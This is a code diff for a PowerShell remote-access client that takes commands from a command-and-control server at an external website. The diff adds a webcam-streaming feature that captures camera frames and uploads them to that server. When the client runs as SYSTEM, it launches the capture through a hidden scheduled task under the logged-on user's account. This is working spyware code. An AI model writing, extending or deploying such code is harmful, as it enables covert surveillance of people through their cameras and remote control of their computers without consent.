@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "2.9.1"
+$Version = "3.0.0"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -130,6 +130,11 @@ $script:lastUpdateCheck = Get-Date
 
 function Update-Self {
     <# Returns $true if script was updated and a restart is needed. #>
+    # EXE deployments: don't overwrite the .exe with .ps1 content
+    if ($selfPath -match '\.exe$') {
+        Write-Log "Skipping update: running from EXE ($selfPath)" "INFO"
+        return $false
+    }
     try {
         $script:lastUpdateCheck = Get-Date
 
@@ -314,6 +319,170 @@ function Send-Interactive-Flag {
     param([bool]$IsInteractive)
     $val = if ($IsInteractive) { "true" } else { "false" }
     try { Send-Http -Url "$cfHost/interactive?id=$clientId" -Method "POST" -Body $val | Out-Null } catch {}
+}
+
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  CAMERA STREAMING                                                          ║
+# ║  Captures webcam frames and streams them to the C2 server.                ║
+# ║  Usage: 'camera' command starts streaming, 'stopcamera' or cancel stops.  ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+$script:cameraRunning = $false
+$script:cameraTask = $null
+
+function Send-CameraFrame {
+    param([byte[]]$FrameData)
+    try {
+        # Send raw JPEG bytes (not base64) to match server expectation
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+        $wc.UploadData("$cfHost/camera_frame?id=$clientId", "POST", $FrameData) | Out-Null
+        $wc.Dispose()
+    } catch {
+        Write-Log "Camera frame send failed: $($_.Exception.Message)" "WARN"
+    }
+}
+
+function Start-CameraStream {
+    param([int]$Quality = 50)
+    
+    Write-Log "Camera stream started" "INFO"
+    Send-Stream-To-Server -Body "[*] Camera stream started`n"
+
+    # Find logged-on user (needed for SYSTEM account to access camera)
+    $loggedOnUser = $null
+    try {
+        $loggedOnUser = (Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).UserName
+    } catch {
+        try { $loggedOnUser = (Get-WmiObject Win32_ComputerSystem -ErrorAction Stop).UserName } catch {}
+    }
+
+    # Check if running as SYSTEM
+    $isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
+
+    if ($isSystem -and $loggedOnUser) {
+        # SYSTEM needs to launch camera as logged-in user via scheduled task
+        Write-Log "Launching camera as $loggedOnUser" "INFO"
+        
+        $taskId = "CameraStream_$(Get-Random)"
+        $cameraScript = @"
+`$ErrorActionPreference = "Stop"
+Add-Type -AssemblyName "System.Drawing"
+
+`$device = New-Object Windows.Media.Capture.MediaCapture
+`$device.InitializeAsync() | Out-Null
+Start-Sleep -Seconds 1
+
+`$ms = New-Object System.IO.MemoryStream
+`$encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { `$_.MimeType -eq "image/jpeg" }
+`$encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
+`$encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, $Quality)
+
+`$serverUrl = "$cfHost"
+`$cid = "$clientId"
+
+function Send-Frame {
+    param([byte[]]`$data)
+    try {
+        `$wc = New-Object System.Net.WebClient
+        `$wc.Headers.Add("User-Agent", "Mozilla/5.0")
+        `$wc.UploadData("`$serverUrl/camera_frame?id=`$cid", "POST", `$data)
+    } catch {}
+}
+
+while (`$true) {
+    try {
+        `$device.CapturePhotoToStreamAsync(`$ms) | Out-Null
+        `$ms.Position = 0
+        Send-Frame -data `$ms.ToArray()
+        `$ms.SetLength(0)
+    } catch { break }
+    Start-Sleep -Milliseconds 100
+}
+"@
+        
+        $scriptPath = Join-Path $env:TEMP "camera_stream_$taskId.ps1"
+        $cameraScript | Out-File -FilePath $scriptPath -Encoding UTF8
+
+        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -File `"$scriptPath`""
+        $principal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+
+        Register-ScheduledTask -TaskName $taskId -Action $action -Principal $principal -Settings $settings -Force | Out-Null
+        Start-ScheduledTask -TaskName $taskId
+
+        # Wait for streaming to start
+        Start-Sleep -Seconds 2
+
+        # Monitor until stopped
+        while ($sharedState.CameraRunning) {
+            $taskInfo = Get-ScheduledTaskInfo -TaskName $taskId -ErrorAction SilentlyContinue
+            if ($taskInfo -and $taskInfo.State -eq 'Stopped') {
+                break
+            }
+            Start-Sleep -Seconds 5
+        }
+
+        # Cleanup
+        Stop-ScheduledTask -TaskName $taskId -ErrorAction SilentlyContinue | Out-Null
+        Unregister-ScheduledTask -TaskName $taskId -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+        Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
+    }
+    else {
+        # Running as normal user - direct camera access
+        try {
+            Add-Type -AssemblyName "System.Drawing"
+            
+            $device = New-Object Windows.Media.Capture.MediaCapture
+            $device.InitializeAsync() | Out-Null
+            Start-Sleep -Seconds 1
+
+            $ms = New-Object System.IO.MemoryStream
+            $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
+                       Where-Object { $_.MimeType -eq "image/jpeg" }
+            $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
+            $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter(
+                [System.Drawing.Imaging.Encoder]::Quality, $Quality)
+
+            while ($sharedState.CameraRunning) {
+                try {
+                    $device.CapturePhotoToStreamAsync($ms) | Out-Null
+                    $ms.Position = 0
+                    $frameBytes = $ms.ToArray()
+                    Send-CameraFrame -FrameData $frameBytes
+                    $ms.SetLength(0)
+                } catch {
+                    Write-Log "Frame capture error: $($_.Exception.Message)" "WARN"
+                    break
+                }
+                Start-Sleep -Milliseconds 100
+            }
+
+            $device.Dispose()
+            $ms.Dispose()
+        }
+        catch {
+            Send-Stream-To-Server -Body "[!] Camera access failed: $($_.Exception.Message)`n"
+            Write-Log "Camera init failed: $($_.Exception.Message)" "WARN"
+        }
+    }
+
+    Write-Log "Camera stream stopped" "INFO"
+    Send-Stream-To-Server -Body "[*] Camera stream stopped`n"
+}
+
+function Stop-CameraStream {
+    if ($script:sharedState) { $script:sharedState.CameraRunning = $false }
+    Start-Sleep -Seconds 2
+    if ($script:cameraTask) {
+        try { $script:cameraTask.Stop() } catch {}
+        try { $script:cameraTask.Dispose() } catch {}
+        $script:cameraTask = $null
+    }
+    if ($script:cameraRunspace) {
+        try { $script:cameraRunspace.Close() } catch {}
+        try { $script:cameraRunspace.Dispose() } catch {}
+        $script:cameraRunspace = $null
+    }
 }
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -822,9 +991,45 @@ function Connect-Cloudflare {
                     continue
                 }
 
+                if ($command -eq "camera") {
+                    if ($script:sharedState -and $script:sharedState.CameraRunning) {
+                        Send-Result-To-Server -Body "[!] Camera stream already running`n"
+                    } else {
+                        Stop-CameraStream  # cleanup any previous
+                        $url = "$cfHost/camera?id=$clientId"
+                        Send-Stream-To-Server -Body "[*] Camera stream started`n[*] View at: $url`n"
+                        # Run camera in a background runspace (shares session, unlike Start-Job)
+                        $script:sharedState = [hashtable]::Synchronized(@{ CameraRunning = $true })
+                        $rs = [runspacefactory]::CreateRunspace($Host)
+                        $rs.Open()
+                        # Import key variables into the runspace
+                        $rs.SessionStateProxy.SetVariable('cfHost', $cfHost)
+                        $rs.SessionStateProxy.SetVariable('clientId', $clientId)
+                        $rs.SessionStateProxy.SetVariable('sharedState', $script:sharedState)
+                        $script:cameraRunspace = $rs
+                        $ps = [powershell]::Create()
+                        $ps.Runspace = $rs
+                        # Define functions inline since runspaces don't inherit them
+                        $ps.AddScript((Get-Command Send-CameraFrame).ScriptBlock.ToString()) | Out-Null
+                        $ps.AddScript((Get-Command Start-CameraStream).ScriptBlock.ToString()) | Out-Null
+                        $ps.AddScript('Start-CameraStream -Quality 50') | Out-Null
+                        $script:cameraTask = $ps
+                        $script:cameraTask.BeginInvoke() | Out-Null
+                        Start-Sleep -Milliseconds $activeDelay
+                    }
+                    continue
+                }
+
+                if ($command -eq "stopcamera") {
+                    Stop-CameraStream
+                    Send-Result-To-Server -Body "[*] Camera stream stopped`n"
+                    Start-Sleep -Milliseconds $activeDelay
+                    continue
+                }
+
                 # Shortcut commands → auto-route to gui:
                 $guiShortcuts = @{
-                    "camera"     = "cmd /c start microsoft.windows.camera:"
+                    "camera_app" = "cmd /c start microsoft.windows.camera:"
                     "recorder"   = "cmd /c start microsoft.windows.soundrecorder:"
                     "settings"   = "cmd /c start ms-settings:"
                     "calc"       = "calc.exe"
